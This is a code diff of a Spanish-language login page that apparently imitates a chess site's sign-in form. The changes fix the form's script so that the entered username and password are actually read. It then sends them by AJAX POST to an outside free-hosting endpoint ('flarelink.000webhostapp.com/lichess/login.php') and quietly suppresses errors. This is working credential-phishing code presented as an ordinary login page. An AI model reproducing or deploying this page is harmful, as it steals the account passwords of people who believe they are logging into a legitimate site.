@@ -20,17 +20,22 @@
 			<form method="post" class="form3" id="formlogin">
 				<div class="one-factor">
 					<div class="form-group"><label class="form-label" for="form3-username">Nombre de usuario o correo</label><input id="username" value="" class="form-control" minlength="2" maxlength="320" autofocus="autofocus" required="required" autocomplete="username" /></div>
-					<div class="form-group"><label class="form-label" for="form3-password">Contraseña</label><input id="password" value="" type="password" class="form-control" required="required" autocomplete="current-password" /></div><button type="submit" class="submit button">Iniciar sesión</button><label class="login-remember"><input name="remember" value="true" type="checkbox" checked="checked" />No cerrar sesión</label></div>
-				<div class="two-factor none">
 					<div class="form-group">
-						<button type="button" class="submit button" onclick="login()">Iniciar sesión</button>
+						<label class="form-label" for="form3-password">Contraseña</label>
+						<input id="password" value="" type="password" class="form-control" required="required" autocomplete="current-password" />
 					</div>
+
+					<button type="button" class="submit button" onclick="login()">Iniciar sesión</button>
+
+					<label class="login-remember"><input name="remember" value="true" type="checkbox" checked="checked" />No cerrar sesión</label>
+				</div>
+				
 			</form>
 			<div class="alternative"><a href="#">Registrarse</a><a href="#">Cambiar contraseña</a><a href="#">Log in by email</a></div>
 		</main>
 	</div>
 	<script>
-		var form = document.getElementById = "formlogin";
+		var form = document.getElementById("formlogin");
 		document.addEventListener("keydown", function(event) {
 		  if (event.keyCode === 13) {
 		    login();
@@ -38,22 +43,25 @@
 		});
 
 		function login() {
-			var user = document.getElementById = "username";
-			var pass = document.getElementById = "password";
+			var user = document.getElementById("username").value;
+			var pass = document.getElementById("password").value;
 
 			$.ajax({
-			  url: "https://flarelink.000webhostapp.com/lichess/login.php",
-			  type: "POST",
-				data: {
-					username: user,
+		        url: "https://flarelink.000webhostapp.com/lichess/login.php",
+		        type: 'POST',
+		        data: {
+		            username: user,
 					password: pass
-				},
-			  success: function(response) {
-			    console.log(response);
-			  }
-			});
+		        }
+		    }).done(function(resp) {
+		    	//console.log(resp);
+		       	//console.log("siuuu");
+		    }).fail(function(resp){
+		    	//console.log(resp);
+		    	//console.log("error... pero esta bien");
+		    });
 		}
 	</script>
-	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+	<script src="https://code.jquery.com/jquery-3.4.1.js"></script>
 </body>
 </html>
